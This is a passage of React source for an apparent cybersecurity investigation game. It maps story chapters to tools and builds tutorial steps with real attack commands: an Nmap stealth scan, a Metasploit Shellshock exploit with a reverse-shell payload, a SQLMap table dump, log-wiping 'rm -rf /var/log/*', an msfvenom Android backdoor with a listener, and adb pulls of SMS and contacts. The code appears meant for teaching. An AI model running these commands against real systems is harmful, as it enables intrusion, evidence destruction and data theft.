  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [analysisData, setAnalysisData] = useState(null);
  const [showLogsModal, setShowLogsModal] = useState(false);
  const [selectedTool, setSelectedTool] = useState(null);
  const [showToolPanel, setShowToolPanel] = useState(false); // Show tool in side panel
  const [usedTools, setUsedTools] = useState(new Set());
  const [completedActions, setCompletedActions] = useState(new Set());
  const [showCompaniesModal, setShowCompaniesModal] = useState(false);
  const [selectedCompany, setSelectedCompany] = useState(null);
  const [hiredIntern, setHiredIntern] = useState(null);
  const [internResults, setInternResults] = useState(null);
  const [toolInstructions, setToolInstructions] = useState({}); // { toolId_stepId: { completedSteps: Set, allSteps: [] } }
  const [stepCards, setStepCards] = useState([]); // All parsed step cards
  const [currentStepCardIndex, setCurrentStepCardIndex] = useState(0); // Current step card being viewed

  // Map step IDs to required tools across all chapters
  // Format: chapterId_stepId: [tools]
  const stepTools = {
    // Chapter 1
    '1_1': [], // Initial Briefing
    '1_2': [{ id: 'nmap', name: 'Nmap', icon: FaNetworkWired }], // Reconnaissance
    '1_3': [{ id: 'nmap', name: 'Nmap', icon: FaNetworkWired }], // Following the Trail
    '1_4': [{ id: 'metasploit', name: 'Metasploit', icon: FaBomb }], // Infiltration
    '1_5': [{ id: 'nmap', name: 'Nmap', icon: FaNetworkWired }], // Network Map
    '1_6': [{ id: 'nmap', name: 'Nmap', icon: FaNetworkWired }, { id: 'sqlmap', name: 'SQLMap', icon: FaDatabase }], // Data Extraction
    '1_7': [{ id: 'wireshark', name: 'Wireshark', icon: FaEye }], // Communication Hub
    '1_8': [{ id: 'metasploit', name: 'Metasploit', icon: FaBomb }], // Attack Platform
    '1_9': [{ id: 'osint', name: 'OSINT', icon: FaSearch }], // The Mastermind
    '1_10': [], // Final Operation
    
    // Chapter 2
    '2_1': [{ id: 'nmap', name: 'Nmap', icon: FaNetworkWired }], // Following the Digital Trail
    '2_2': [{ id: 'metasploit', name: 'Metasploit', icon: FaBomb }, { id: 'osint', name: 'OSINT', icon: FaSearch }], // Server Log Analysis
    '2_3': [], // The Arrest Warrant
    '2_4': [], // The Arrest
    
    // Chapter 3
    '3_1': [], // Creating the Persona
    '3_2': [], // Gaining Trust
    '3_3': [], // Deep Infiltration
    '3_4': [], // The Sting Setup
    
    // Chapter 4
    '4_1': [{ id: 'nmap', name: 'Nmap', icon: FaNetworkWired }], // Network Mapping
    '4_2': [{ id: 'nmap', name: 'Nmap', icon: FaNetworkWired }], // Vulnerability Assessment
    '4_3': [{ id: 'nmap', name: 'Nmap', icon: FaNetworkWired }, { id: 'sqlmap', name: 'SQLMap', icon: FaDatabase }], // The Data Extraction
    '4_4': [{ id: 'wireshark', name: 'Wireshark', icon: FaEye }], // Communication Interception
    
    // Chapter 5
    '5_1': [], // Gathering Evidence
    '5_2': [{ id: 'metasploit', name: 'Metasploit', icon: FaBomb }], // Server Access Confirmation
    '5_3': [], // The Coordinated Raid
    '5_4': [], // Evidence Analysis
    
    // Chapter 6
    '6_1': [{ id: 'metasploit', name: 'Metasploit', icon: FaBomb }], // Financial Investigation
    '6_2': [{ id: 'osint', name: 'OSINT', icon: FaSearch }], // Cryptocurrency Tracking
    '6_3': [], // The Money Laundering Operation
    '6_4': [], // CryptoKing Identity Confirmation
    
    // Chapter 7
    '7_1': [], // Deep Cover Operation
    '7_2': [], // The Sting Operation
    '7_3': [], // Advanced Social Engineering
    '7_4': [], // The Double Agent
    
    // Chapter 8
    '8_1': [], // Preparing the Takedown
    '8_2': [], // Evidence Finalization
    '8_3': [], // The Simultaneous Raids
    '8_4': [], // Post-Arrest Intelligence
    
    // Chapter 9
    '9_1': [{ id: 'osint', name: 'OSINT', icon: FaSearch }], // The Kingpin Investigation
    '9_2': [{ id: 'metasploit', name: 'Metasploit', icon: FaBomb }], // Final Server Access
    '9_3': [{ id: 'osint', name: 'OSINT', icon: FaSearch }], // Location Intelligence
    '9_4': [], // Final Evidence Compilation
    
    // Chapter 10
    '10_1': [], // The Final Briefing
    '10_2': [], // Server Takedown
    '10_3': [], // The Raid
    '10_4': [] // Mission Complete
    
    // Delusional Criminal Empire - Chapter 1
    // Note: Using chapter IDs 1-10 for delusional, but they're in different story path
    // The tool mapping will work based on chapterId_stepId format
  };

  // Get tools for current step
  const getToolsForStep = (stepId, chapterId) => {
    const key = `${chapterId}_${stepId}`;
    return stepTools[key] || [];
  };

  // Generate detailed lab instructions for each tool
  const getLabInstructions = (toolId, stepId, subStepContent) => {
    const targetIP = selectedCompany?.targetIP || '198.51.100.42';
    const networkRange = selectedCompany?.networkRange || '198.51.100.0/24';
    const companyName = selectedCompany?.name || 'Target';
    
    const instructions = {
      nmap: [
        {
          number: 1,
          title: 'Open Nmap Tool',
          description: 'Click the Nmap button above to open the network scanner interface.',
          command: null,
          details: [
            'The Nmap tool will open in a modal window',
            'You will see a terminal-like interface with an input field',
            'The tool is ready to accept commands'
          ]
        },
        {
          number: 2,
          title: 'Enter Scan Command',
          description: `Type the following command in the Nmap input field to scan the target:`,
          command: `nmap -sS -sV -O ${targetIP}`,
          details: [
            `-sS: Performs a SYN stealth scan (faster and less detectable)`,
            `-sV: Enables version detection to identify service versions`,
            `-O: Enables OS detection to identify the operating system`,
            `${targetIP}: The target IP address to scan`
          ]
        },
        {
          number: 3,
          title: 'Execute the Scan',
          description: 'Click the "Scan" button or press Enter to execute the command.',
          command: null,
          details: [
            'The scan will take a few seconds to complete',
            'You will see real-time output showing the scanning process',
            'Wait for the scan to finish before proceeding'
          ]
        },
        {
          number: 4,
          title: 'Analyze the Results',
          description: 'Review the scan output to identify open ports, services, and vulnerabilities.',
          command: null,
          details: [
            'Look for the "PORT" section showing open ports (22, 80, 443, 8080, etc.)',
            'Check the "SERVICE" column for service names (SSH, HTTP, HTTPS, etc.)',
            'Review the "VERSION" column for service versions (Apache 2.4.29, OpenSSH 7.4, etc.)',
            'Note any CVE numbers or vulnerability warnings',
            'Check the OS detection results (Linux 4.15.0, etc.)'
          ]
        },
        {
          number: 5,
          title: 'Map the Network',
          description: `Scan the entire network subnet to discover all active hosts:`,
          command: `nmap -sn ${networkRange}`,
          details: [
            `-sn: Performs a ping scan (host discovery only, no port scan)`,
            `${networkRange}: The network range to scan`,
            'This will show all active hosts on the network',
            'Note down all discovered IP addresses'
          ]
        },
        {
          number: 6,
          title: 'Document Your Findings',
          description: 'Record all discovered information for the next phase of the operation.',
          command: null,
          details: [
            'List all open ports and services',
            'Document service versions and OS information',
            'Note any vulnerabilities (CVE numbers)',
            'Create a network map with all discovered hosts',
            'Identify the weakest entry point for exploitation'
          ]
        }
      ],
      wireshark: [
        {
          number: 1,
          title: 'Open Wireshark Tool',
          description: 'Click the Wireshark button above to open the packet analyzer interface.',
          command: null,
          details: [
            'Wireshark will open showing the packet capture interface',
            'You will see a list of network interfaces',
            'Select the appropriate interface to capture traffic'
          ]
        },
        {
          number: 2,
          title: 'Start Packet Capture',
          description: 'Click the "Start Capture" button to begin capturing network packets.',
          command: null,
          details: [
            'The capture will start recording all network traffic',
            'Packets will appear in real-time in the packet list',
            'Wait for sufficient traffic to be captured'
          ]
        },
        {
          number: 3,
          title: 'Filter Traffic',
          description: 'Apply filters to focus on specific traffic patterns.',
          command: 'http or tcp.port == 80 or tcp.port == 443',
          details: [
            'Use display filters to show only relevant packets',
            'Filter by protocol (HTTP, HTTPS, TCP, UDP)',
            'Filter by IP address to track specific hosts',
            'Filter by port number to focus on specific services'
          ]
        },
        {
          number: 4,
          title: 'Analyze Packets',
          description: 'Examine packet details to identify communication patterns.',
          command: null,
          details: [
            'Click on packets to view detailed information',
            'Check source and destination IP addresses',
            'Review packet payloads for sensitive data',
            'Look for unusual patterns or suspicious activity',
            'Identify communication between attacker and target'
          ]
        },
        {
          number: 5,
          title: 'Export Evidence',
          description: 'Save important packets for further analysis.',
          command: null,
          details: [
            'Select relevant packets',
            'Export to a file for documentation',
            'Note timestamps and packet numbers',
            'Document findings for the investigation report'
          ]
        }
      ],
      metasploit: [
        {
          number: 1,
          title: 'Open Metasploit Framework',
          description: 'Click the Metasploit button above to open the exploitation framework.',
          command: null,
          details: [
            'Metasploit console will open',
            'You will see the msf6 prompt',
            'The framework is ready to use'
          ]
        },
        {
          number: 2,
          title: 'Search for Exploit',
          description: 'Search for an exploit matching the target service.',
          command: 'search apache',
          details: [
            'Use the search command to find exploits',
            'Search by service name (apache, ssh, mysql, etc.)',
            'Review the list of available exploits',
            'Select an exploit that matches the target service version'
          ]
        },
        {
          number: 3,
          title: 'Select and Configure Exploit',
          description: 'Load the exploit module and configure it for your target.',
          command: `use exploit/linux/http/apache_mod_cgi_bash_env_exec\nset RHOSTS ${targetIP}\nset LHOST <your_ip>\nset payload linux/x64/meterpreter/reverse_tcp`,
          details: [
            'use: Loads the exploit module',
            'set RHOSTS: Sets the target IP address',
            'set LHOST: Sets your local IP (attacker IP)',
            'set payload: Sets the payload to use after exploitation',
            'show options: View all configuration options'
          ]
        },
        {
          number: 4,
          title: 'Execute the Exploit',
          description: 'Run the exploit to gain access to the target system.',
          command: 'exploit',
          details: [
            'Type "exploit" and press Enter',
            'Wait for the exploit to execute',
            'If successful, you will get a meterpreter session',
            'If it fails, try a different exploit or check configuration'
          ]
        },
        {
          number: 5,
          title: 'Interact with Meterpreter',
          description: 'Use meterpreter commands to gather intelligence.',
          command: 'sysinfo\nshell\npwd\nls',
          details: [
            'sysinfo: Get system information',
            'shell: Drop into a system shell',
            'pwd: Show current directory',
            'ls: List files in current directory',
            'cd: Change directory',
            'cat: View file contents'
          ]
        },
        {
          number: 6,
          title: 'Extract Intelligence',
          description: 'Gather evidence and intelligence from the compromised system.',
          command: 'cd /var/log\nls\ncat auth.log',
          details: [
            'Navigate to log directories (/var/log, /var/www, etc.)',
            'Search for attack logs and evidence',
            'Extract configuration files',
            'Download important files using meterpreter',
            'Document all findings'
          ]
        }
      ],
      sqlmap: [
        {
          number: 1,
          title: 'Open SQLMap Tool',
          description: 'Click the SQLMap button above to open the SQL injection testing tool.',
          command: null,
          details: [
            'SQLMap interface will open',
            'You will see input fields for target URL and parameters',
            'The tool is ready to test for SQL injection vulnerabilities'
          ]
        },
        {
          number: 2,
          title: 'Enter Target URL',
          description: `Enter the target URL with a vulnerable parameter:`,
          command: `http://${targetIP}/login.php?id=1`,
          details: [
            'Enter the full URL of the target web application',
            'Include a parameter that might be vulnerable (id, user, etc.)',
            'The parameter will be tested for SQL injection'
          ]
        },
        {
          number: 3,
          title: 'Test for SQL Injection',
          description: 'Run SQLMap to test if the parameter is vulnerable.',
          command: `sqlmap -u "http://${targetIP}/login.php?id=1" --batch`,
          details: [
            '-u: Specifies the target URL',
            '--batch: Runs in non-interactive mode',
            'SQLMap will test various SQL injection techniques',
            'Wait for the test to complete'
          ]
        },
        {
          number: 4,
          title: 'Enumerate Databases',
          description: 'List all available databases on the target system.',
          command: `sqlmap -u "http://${targetIP}/login.php?id=1" --dbs`,
          details: [
            '--dbs: Lists all databases',
            'Review the list of discovered databases',
            'Identify databases containing sensitive information',
            'Note database names for further exploration'
          ]
        },
        {
          number: 5,
          title: 'Extract Table Data',
          description: 'Extract data from specific database tables.',
          command: `sqlmap -u "http://${targetIP}/login.php?id=1" -D stolen_data --tables`,
          details: [
            '-D: Specifies the database name',
            '--tables: Lists all tables in the database',
            'Review table names to identify valuable data',
            'Select tables containing sensitive information'
          ]
        },
        {
          number: 6,
          title: 'Dump Table Contents',
          description: 'Extract all data from selected tables.',
          command: `sqlmap -u "http://${targetIP}/login.php?id=1" -D stolen_data -T users --dump`,
          details: [
            '-T: Specifies the table name',
            '--dump: Extracts all data from the table',
            'Review extracted data for intelligence',
            'Save the data for analysis and reporting'
          ]
        }
      ],
      osint: [
        {
          number: 1,
          title: 'Open OSINT Tool',
          description: 'Click the OSINT button above to open the intelligence gathering tool.',
          command: null,
          details: [
            'OSINT interface will open with multiple tabs',
            'Each tab represents a different intelligence gathering method',
            'Select the appropriate method for your investigation'
          ]
        },
        {
          number: 2,
          title: 'Google Dorking',
          description: 'Use Google search operators to find exposed information.',
          command: 'site:target.com filetype:pdf',
          details: [
            'Select the "Google Dorking" tab',
            'Enter search queries using Google operators',
            'site: restricts search to specific domain',
            'filetype: searches for specific file types',
            'Review results for exposed sensitive information'
          ]
        },
        {
          number: 3,
          title: 'Social Media Investigation',
          description: 'Search social media platforms for target information.',
          command: null,
          details: [
            'Select the "Social Media" tab',
            'Enter target name or username',
            'Search across multiple platforms',
            'Gather information about target personnel',
            'Look for leaked credentials or sensitive posts'
          ]
        },
        {
          number: 4,
          title: 'Shodan Search',
          description: 'Use Shodan to find exposed services and devices.',
          command: `hostname:${companyName}`,
          details: [
            'Select the "Shodan" tab',
            'Enter search queries for exposed services',
            'hostname: searches by hostname',
            'port: searches by open ports',
            'Review results for exposed infrastructure'
          ]
        },
        {
          number: 5,
          title: 'Email Harvesting',
          description: 'Collect email addresses associated with the target.',
          command: null,
          details: [
            'Select the "Email Harvest" tab',
            'Enter target domain name',
            'The tool will search for email addresses',
            'Review discovered email addresses',
            'Note email patterns for social engineering'
          ]
        },
        {
          number: 6,
          title: 'Compile Intelligence Report',
          description: 'Combine all gathered information into a comprehensive report.',
          command: null,
          details: [
            'Review all discovered information',
            'Cross-reference data from different sources',
            'Identify key personnel and infrastructure',
            'Document findings for the operation',
            'Prepare intelligence summary'
          ]
        }
      ]
    };

    return instructions[toolId] || [];
  };

  // Toggle step completion in lab instructions
  const toggleLabStep = (toolId, stepId, stepNumber, cardId) => {
    const key = cardId ? `${toolId}_${stepId}_${cardId}` : `${toolId}_${stepId}`;
    setToolInstructions(prev => {
      const current = prev[key] || { completedSteps: new Set(), allSteps: [] };
      const newCompleted = new Set(current.completedSteps);
      
      if (newCompleted.has(stepNumber)) {
        newCompleted.delete(stepNumber);
      } else {
        newCompleted.add(stepNumber);
      }
      
      return {
        ...prev,
        [key]: {
          ...current,
          completedSteps: newCompleted
        }
      };
    });
  };

  // Companies data with weaknesses and strengths
  const companiesData = [
    {
      id: 'gov_db',
      name: 'Government Database',
      type: 'data',
      icon: FaDatabase,
      targetIP: '198.51.100.42',
      networkRange: '198.51.100.0/24',
      weaknesses: [
        'Outdated SQL server version (2012)',
        'Weak password policies on admin accounts',
        'Unpatched zero-day vulnerability in authentication module',
        'Exposed internal API endpoints',
        'Insufficient network segmentation'
      ],
      strengths: [
        'Multi-factor authentication on critical systems',
        'Regular security audits',
        'Encrypted data at rest',
        '24/7 security monitoring',
        'Backup and disaster recovery systems'
      ],
      weaknessLevel: 'unclear', // Can be 'unclear', 'low', 'medium', 'high'
      securityLevel: 75
    },
    {
      id: 'quantum_shield',
      name: 'QuantumShield Corp',
      type: 'cybersecurity',
      icon: FaShieldAlt,
      targetIP: '203.45.67.89',
      networkRange: '203.45.67.0/24',
      weaknesses: [
        'Overconfident in their security (complacency)',
        'Third-party vendor vulnerabilities',
        'Social engineering susceptibility'
      ],
      strengths: [
        'Advanced intrusion detection systems',
        'Expert security team',
        'Regular penetration testing',
        'Strong encryption standards',
        'Zero-trust architecture'
      ],
      weaknessLevel: 'low',
      securityLevel: 95
    },
    {
      id: 'neo_connect',
      name: 'NeoConnect Telecom',
      type: 'telecom',
      icon: FaNetworkWired,
      targetIP: '172.16.45.128',
      networkRange: '172.16.45.0/24',
      weaknesses: [
        'Legacy infrastructure components',
        'Weak default credentials on network equipment',
        'Insufficient access controls',
        'Unencrypted communication channels'
      ],
      strengths: [
        'Redundant network infrastructure',
        'Network monitoring systems',
        'Regular firmware updates',
        'Physical security measures'
      ],
      weaknessLevel: 'medium',
      securityLevel: 60
    },
    {
      id: 'cyberbank',
      name: 'CyberBank Financial',
      type: 'banking',
      icon: FaDollarSign,
      targetIP: '203.0.113.15',
      networkRange: '203.0.113.0/24',
      weaknesses: [
        'Complex legacy systems with hidden vulnerabilities',
        'Third-party payment processor integration risks'
      ],
      strengths: [
        'Bank-level encryption',
        'Multi-layer security architecture',
        'Fraud detection AI',
        'Regular compliance audits',
        'Insurance coverage'
      ],
      weaknessLevel: 'unclear',
      securityLevel: 98
    }
  ];

  // Intern tiers for social engineering
  const internTiers = [
    {
      id: 'novice',
      name: 'Novice Intern',
      price: 500,
      quality: 0.3,
      speed: 2, // hours
      description: 'Basic social engineering skills. May miss some details.'
    },
    {
      id: 'intermediate',
      name: 'Intermediate Intern',
      price: 2000,
      quality: 0.6,
      speed: 1, // hours
      description: 'Good social engineering skills. Reliable results.'
    },
    {
      id: 'expert',
      name: 'Expert Intern',
      price: 10000,
      quality: 0.9,
      speed: 0.5, // hours
      description: 'Expert-level social engineering. Fast and thorough results.'
    },
    {
      id: 'master',
      name: 'Master Intern',
      price: 50000,
      quality: 1.0,
      speed: 0.25, // hours
      description: 'Elite social engineering specialist. Guaranteed comprehensive results.'
    }
  ];

  const handleHireIntern = (company, intern) => {
    const currentMoney = gameState.phone.owned ? gameState.phone.money : gameState.money;
    if (currentMoney < intern.price) {
      alert(`Insufficient funds! You need $${intern.price.toLocaleString()} to hire this intern.`);
      return;
    }

    // Deduct money (use negative value for UPDATE_MONEY)
    if (gameState.phone.owned) {
      dispatch({ type: 'UPDATE_PHONE_MONEY', payload: -intern.price });
    } else {
      dispatch({ type: 'UPDATE_MONEY', payload: -intern.price });
    }
    
    // Set hired intern
    setHiredIntern({ companyId: company.id, intern });
    
    // Simulate intern work (in real implementation, this would be async)
    setTimeout(() => {
      const results = generateInternResults(company, intern);
      setInternResults(results);
      setCompletedActions(prev => new Set([...prev, 'navigate_companies']));
    }, 100);
  };

  const generateInternResults = (company, intern) => {
    const baseInfo = company.weaknesses.filter((_, idx) => Math.random() < intern.quality);
    const additionalInfo = [];
    
    if (intern.quality >= 0.6) {
      additionalInfo.push('Employee email format discovered: firstname.lastname@company.com');
    }
    if (intern.quality >= 0.9) {
      additionalInfo.push('Key personnel identified: CTO uses weak password patterns');
      additionalInfo.push('Internal network structure mapped');
    }
    if (intern.quality >= 1.0) {
      additionalInfo.push('Security team schedule discovered');
      additionalInfo.push('Backup system credentials found');
    }

    return {
      discoveredWeaknesses: baseInfo,
      additionalInfo,
      internName: intern.name,
      timeTaken: intern.speed
    };
  };

  // Parse instructions to extract actionable items
  const extractActions = (instructions) => {
    if (!instructions) return [];
    const actions = [];
    const instructionText = instructions.join(' ').toLowerCase();
    
    // Check for navigation actions
    if (instructionText.includes('go to companies') || instructionText.includes('navigate to companies') || instructionText.includes('visit companies')) {
      actions.push({
        id: 'navigate_companies',
        label: 'Go to Companies Page',
        type: 'navigation',
        route: '/companies',
        guidance: 'Navigate to the Companies page to view available targets. Look for the "Government Database" company and click "View Attack Details" to proceed with the investigation.'
      });
    }
    
    if (instructionText.includes('go to phone') || instructionText.includes('navigate to phone') || instructionText.includes('use phone')) {
      actions.push({
        id: 'navigate_phone',
        label: 'Go to Phone',
        type: 'navigation',
        route: '/phone',
        guidance: 'Navigate to the Phone page to access phone features and tools needed for this step.'
      });
    }
    
    if (instructionText.includes('go to env') || instructionText.includes('navigate to env') || instructionText.includes('open environment')) {
      actions.push({
        id: 'navigate_env',
        label: 'Go to Environment Tools',
        type: 'navigation',
        route: '/env',
        guidance: 'Navigate to the Environment page to access hacking tools like Wireshark, Nmap, and Metasploit.'
      });
    }
    
    // Check for specific actions
    if (instructionText.includes('delete logs') || instructionText.includes('remove logs') || instructionText.includes('clear logs')) {
      actions.push({
        id: 'delete_logs',
        label: 'Delete Logs',
        type: 'action',
        guidance: 'To delete logs: 1) Open the terminal or command prompt, 2) Navigate to the log directory (usually /var/log or C:\\Windows\\Logs), 3) Use the command: rm -rf /var/log/* (Linux) or del /F /Q C:\\Windows\\Logs\\* (Windows), 4) Alternatively, use the command: adb shell rm -rf /data/logs/* to delete Android logs via ADB.'
      });
    }
    
    if (instructionText.includes('clear cache') || instructionText.includes('delete cache')) {
      actions.push({
        id: 'clear_cache',
        label: 'Clear Cache',
        type: 'action',
        guidance: 'To clear cache: 1) Open terminal/command prompt, 2) For browser cache: Clear browser data in settings, 3) For system cache: Use command "adb shell pm clear-cache" for Android, or "sudo apt-get clean" for Linux, 4) For application cache: Navigate to app data directory and delete cache folder.'
      });
    }
    
    if (instructionText.includes('install') && instructionText.includes('backdoor')) {
      actions.push({
        id: 'install_backdoor',
        label: 'Install Backdoor',
        type: 'action',
        guidance: 'To install a backdoor: 1) First, gain root/admin access to the target system, 2) Use Metasploit to generate a payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o backdoor.apk, 3) Transfer the backdoor to the target device, 4) Execute: adb install backdoor.apk, 5) Set up listener: msfconsole -> use exploit/multi/handler -> set payload android/meterpreter/reverse_tcp -> exploit'
      });
    }
    
    if (instructionText.includes('extract data') || instructionText.includes('exfiltrate')) {
      actions.push({
        id: 'extract_data',
        label: 'Extract Data',
        type: 'action',
        guidance: 'To extract data: 1) Use adb pull to copy files: adb pull /sdcard/Download/ /local/path/, 2) For database extraction: adb shell "run-as com.package.name cat /data/data/com.package.name/databases/db.db" > db.db, 3) For contacts: adb shell content query --uri content://contacts/people, 4) For SMS: adb shell content query --uri content://sms/'
      });
    }
    
    return actions;
  };

  const handleAction = (action) => {
    if (action.type === 'navigation') {
      if (action.id === 'navigate_companies') {
        // Show companies modal instead of navigating
        setShowCompaniesModal(true);
      } else {
        // Store current investigation state to return to
        const returnState = {
          step: currentStep,
          stepIndex: currentStepIndex,
          chapter: chapter?.id
        };
        localStorage.setItem('investigation_return_state', JSON.stringify(returnState));
        navigate(action.route);
      }
    } else {
      // Mark action as completed
      setCompletedActions(prev => new Set([...prev, action.id]));
    }
  };

  const handleCompanySelected = () => {
    // Mark action as completed
    setCompletedActions(prev => new Set([...prev, 'navigate_companies']));
    // Store selected company for use in tools (don't clear it yet)
    // Close modals but keep selectedCompany state for tool context
    setShowCompaniesModal(false);
    setInternResults(null);
    setHiredIntern(null);
    // Automatically advance to Step 2 if we're on Step 1
    if (currentStepIndex === 0 && steps.length > 1) {
      setCurrentStepIndex(1);
    }
  };

  // Get story configuration
  const personalityStories = storyConfig[character?.personality];
  const jobStory = personalityStories?.[story?.job];
  
  // Find which chapter contains the current step
  // Use chapterId from step if provided (when coming from chapter selection)
  let chapter = null;
  if (step?.chapterId && jobStory?.chapters) {
    chapter = jobStory.chapters.find(c => c.id === step.chapterId);
  }
  
  // If not found, search for chapter containing this step
  if (!chapter && step && jobStory?.chapters) {
    for (const ch of jobStory.chapters) {
      if (ch.steps?.some(s => s.id === step.id)) {
        chapter = ch;
        break;
      }
    }
  }
  
  // Fallback to current chapter if step not found
  if (!chapter) {
    chapter = jobStory?.chapters?.find(c => c.id === story?.currentChapter);
  }
  
  const steps = chapter?.steps || [];
  const currentStep = steps[currentStepIndex];

  // Generate realistic investigation data
  useEffect(() => {
    if (step) {
      const data = generateInvestigationData(step);
      setAnalysisData(data);
    }
  }, [step]);

  // Parse instructions into step cards when currentStep changes
  useEffect(() => {
    if (currentStep && currentStep.instructions) {
      const cards = [];
      let currentCard = null;
      
      currentStep.instructions.forEach((instruction, idx) => {
        if (instruction.startsWith('STEP') || instruction.match(/^STEP \d+/)) {
          // Start a new card
          if (currentCard) {
            cards.push(currentCard);
          }
          currentCard = {
            id: cards.length + 1,
            title: instruction,
            content: [],
            stepNumber: instruction.match(/STEP (\d+)/)?.[1] || cards.length + 1
          };
        } else if (currentCard) {
          currentCard.content.push(instruction);
        }
      });
      
      if (currentCard) {
        cards.push(currentCard);
      }
      
      setStepCards(cards);
      setCurrentStepCardIndex(0); // Reset to first card
      setSelectedTool(null); // Reset selected tool
    }
  }, [currentStep]);

  const generateInvestigationData = (step) => {
    const attackStartTime = new Date(Date.now() - 48 * 60 * 60 * 1000);
    
    // Determine story type based on personality and job
    const isDelusional = character?.personality === 'delusional' && story?.job === 'criminal_empire';
    const isProfessional = character?.personality === 'professional' && story?.job === 'government';
    
    // Generate story-specific data
    let baseData;
    
    if (isDelusional) {
      // Criminal Empire story data
      baseData = {
        attackTimestamp: attackStartTime.toISOString(),
        sourceIP: '172.16.45.128',
        targetSystem: 'corp-financial-01',
        attackDuration: '3h 12m 45s',
        dataExfiltrated: '1.2 TB',
        affectedRecords: '5,234,891',
        attackVector: 'Custom RAT + SQL Injection',
        compromisedAccounts: ['ceo@targetcorp.com', 'cfo@targetcorp.com', 'admin@targetcorp.com'],
        networkNodes: [
          { ip: '172.16.45.128', hostname: 'chaos-c2-01', status: 'active', lastSeen: '1h ago' },
          { ip: '172.16.45.129', hostname: 'chaos-storage-01', status: 'active', lastSeen: '45m ago' },
          { ip: '172.16.45.130', hostname: 'chaos-marketplace', status: 'active', lastSeen: '30m ago' },
          { ip: '172.16.45.131', hostname: 'chaos-botnet-01', status: 'active', lastSeen: '15m ago' },
          { ip: '172.16.45.132', hostname: 'chaos-tor-relay', status: 'active', lastSeen: '5m ago' }
        ],
        storyTitle: 'Criminal Empire Investigation',
        caseName: 'The Chaos Network Attack',
        attackerAlias: 'ChaosMaster',
        organizationName: 'Chaos Network'
      };
    } else if (isProfessional) {
      // Professional Shadow Network story data
      baseData = {
        attackTimestamp: attackStartTime.toISOString(),
        sourceIP: '198.51.100.42',
        targetSystem: 'gov-db-primary-01',
        attackDuration: '2h 34m 12s',
        dataExfiltrated: '847.3 GB',
        affectedRecords: '2,847,392',
        attackVector: 'Zero-day CVE-2024-XXXXX',
        compromisedAccounts: ['admin@gov.local', 'sysadmin@gov.local', 'dbadmin@gov.local'],
        networkNodes: [
          { ip: '198.51.100.42', hostname: 'shadow-c2-01', status: 'active', lastSeen: '2h ago' },
          { ip: '198.51.100.43', hostname: 'shadow-storage-01', status: 'active', lastSeen: '1h ago' },
          { ip: '198.51.100.44', hostname: 'shadow-comm-01', status: 'active', lastSeen: '30m ago' },
          { ip: '198.51.100.45', hostname: 'shadow-attack-01', status: 'active', lastSeen: '15m ago' },
          { ip: '198.51.100.46', hostname: 'shadow-backup-01', status: 'active', lastSeen: '5m ago' }
        ],
        storyTitle: 'Government Security Investigation',
        caseName: 'The Shadow Network Attack',
        attackerAlias: 'ShadowMaster',
        organizationName: 'Shadow Network'
      };
    } else {
      // Default fallback
      baseData = {
        attackTimestamp: attackStartTime.toISOString(),
        sourceIP: '192.168.1.100',
        targetSystem: 'target-system-01',
        attackDuration: '2h 0m 0s',
        dataExfiltrated: '500 GB',
        affectedRecords: '1,000,000',
        attackVector: 'Unknown',
        compromisedAccounts: ['admin@target.local'],
        networkNodes: [
          { ip: '192.168.1.100', hostname: 'attacker-01', status: 'active', lastSeen: '1h ago' }
        ],
        storyTitle: 'Security Investigation',
        caseName: 'Cyber Attack Investigation',
        attackerAlias: 'Unknown',
        organizationName: 'Unknown'
      };
    }
    
    // Generate story-specific log entries
    let logEntries;
    if (isDelusional) {
      // Criminal Empire attack logs
      logEntries = [
        { 
          timestamp: new Date(attackStartTime.getTime() + 0).toISOString(),
          event: 'INITIAL_RECONNAISSANCE',
          severity: 'HIGH',
          source: '172.16.45.128',
          before: 'Target system was operating normally. Corporate financial database was accessible. Security monitoring was active but not detecting advanced scanning techniques.',
          after: 'ChaosMaster performed advanced network scanning and service enumeration. Identified vulnerable financial database endpoint. Discovered weak authentication on admin panel. Began mapping corporate infrastructure for maximum impact.',
          timeAgo: '48 hours ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 8 * 60 * 1000).toISOString(),
          event: 'SQL_INJECTION_EXPLOIT',
          severity: 'CRITICAL',
          source: '172.16.45.128',
          before: 'Financial database was accessible via web application. Input validation was weak. Login attempts were logged but security team was understaffed.',
          after: 'SQL injection successful. ChaosMaster gained full database access. Extracted customer financial records, credit card data, and transaction histories. Began preparing data packages for dark web marketplace sale.',
          timeAgo: '47 hours 52 minutes ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 15 * 60 * 1000).toISOString(),
          event: 'PRIVILEGE_ESCALATION',
          severity: 'CRITICAL',
          source: '172.16.45.128',
          before: 'Attacker had database read access. Could query financial records but not modify transactions. System appeared secure from admin perspective.',
          after: 'ChaosMaster exploited zero-day vulnerability to escalate to root access. Now has full system control. Can modify transactions, transfer funds, and access all corporate data. Installed custom RAT for persistent access.',
          timeAgo: '47 hours 45 minutes ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 25 * 60 * 1000).toISOString(),
          event: 'DATA_EXFILTRATION_START',
          severity: 'CRITICAL',
          source: '172.16.45.128',
          before: 'Financial data was encrypted at rest. Access logs showed normal operations. Network bandwidth was within expected parameters.',
          after: 'ChaosMaster began massive data exfiltration. Extracting 1.2 TB of financial records, customer data, and corporate secrets. Data being compressed and transferred to Chaos Network storage servers. Transfer rate: ~8.2 GB/min. Corporate network experiencing slowdowns but IT team unaware of breach.',
          timeAgo: '47 hours 35 minutes ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 3 * 60 * 60 * 1000 + 10 * 60 * 1000).toISOString(),
          event: 'BACKDOOR_DEPLOYMENT',
          severity: 'CRITICAL',
          source: '172.16.45.128',
          before: 'System had no persistent unauthorized access. All connections required authentication. Security monitoring was active.',
          after: 'ChaosMaster deployed custom backdoor (chaos_rat.exe) in system32 folder. Backdoor creates encrypted reverse shell every 3 minutes to Chaos C2 server. Allows persistent access even after initial breach is discovered. Process hidden from antivirus and monitoring tools. Corporate security team completely unaware.',
          timeAgo: '44 hours 50 minutes ago'
        },
        { 
          timestamp: new Date(attackStartTime.getTime() + 3 * 60 * 60 * 1000 + 45 * 60 * 1000).toISOString(),
          event: 'ATTACK_COMPLETE',
          severity: 'CRITICAL',
          source: '172.16.45.128',
          before: 'Attack was in progress. Corporate security team was investigating network slowdowns but had not identified the breach. System appeared to be functioning normally.',
